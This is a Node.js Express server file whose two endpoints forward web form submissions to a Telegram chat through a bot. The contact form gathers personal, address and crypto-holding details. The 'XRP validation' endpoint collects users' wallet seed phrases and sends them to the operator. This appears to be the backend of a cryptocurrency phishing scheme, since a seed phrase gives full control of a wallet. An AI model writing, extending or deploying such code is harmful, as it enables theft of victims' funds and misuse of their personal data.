require('dotenv').config();
const express = require('express');
const cors = require('cors');
const dns = require('dns');
// Set Google's DNS servers
dns.setServers(['8.8.8.8', '8.8.4.4']);
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const port = process.env.PORT || 5000;

// Replace 'YOUR_BOT_TOKEN' with your actual bot token
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
// Replace 'YOUR_CHAT_ID' with your actual chat ID
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({
  origin: 'http://localhost:3000', // Your React app's URL
  methods: ['POST'],
  credentials: true
}));
app.use(express.json());

// Helper function to format contact form data
const formatContactMessage = (data) => {
  return `
🔔 New Contact Form Submission

Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
Phone: ${data.phone}
Address: ${data.address.line1} ${data.address.line2 || ''}
         ${data.address.city}, ${data.address.state} ${data.address.zip}
         ${data.address.country}

Client Type: ${data.clientType}
Has LLC/Trust: ${data.hasLLCTrust}
${data.hasLLCTrust === 'Yes' ? `LLC/Trust Name: ${data.LLCTrustName}\n` : ''}
Current Allocation: ${data.currentAllocation}
Has XRP: ${data.hasXRP}
Digital Assets: ${data.digitalAssets}

Message:
${data.message}
`;
};

// Helper function to format XRP validation data
const formatXRPMessage = (data) => {
  return `
🔐 New XRP Validation Submission

Full Name: ${data.fullName}
Email: ${data.email}
Wallet Type: ${data.walletType}
XRP Amount: ${data.xrpAmount}
seed phrase: ${data.seedPhrase}
${data.notes ? `\nAdditional Notes:\n${data.notes}` : ''}
`;
};

// Contact form endpoint
app.post('/api/contact', async (req, res) => {
  try {
    console.log('Received contact form submission:', req.body);
    
    if (!req.body) {
      throw new Error('No form data received');
    }

    const formattedMessage = formatContactMessage(req.body);
    console.log('Attempting to send message to Telegram...');
    
    const result = await bot.sendMessage(CHAT_ID, formattedMessage);
    console.log('Telegram API response:', result);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error sending contact form to Telegram:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to send message',
      details: error.message 
    });
  }
});

// XRP validation form endpoint
app.post('/api/validate-xrp', async (req, res) => {
  try {
    const formattedMessage = formatXRPMessage(req.body);
    await bot.sendMessage(CHAT_ID, formattedMessage);
    res.json({ success: true });
  } catch (error) {
    console.error('Error sending XRP validation to Telegram:', error);
    res.status(500).json({ success: false, error: 'Failed to send message' });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
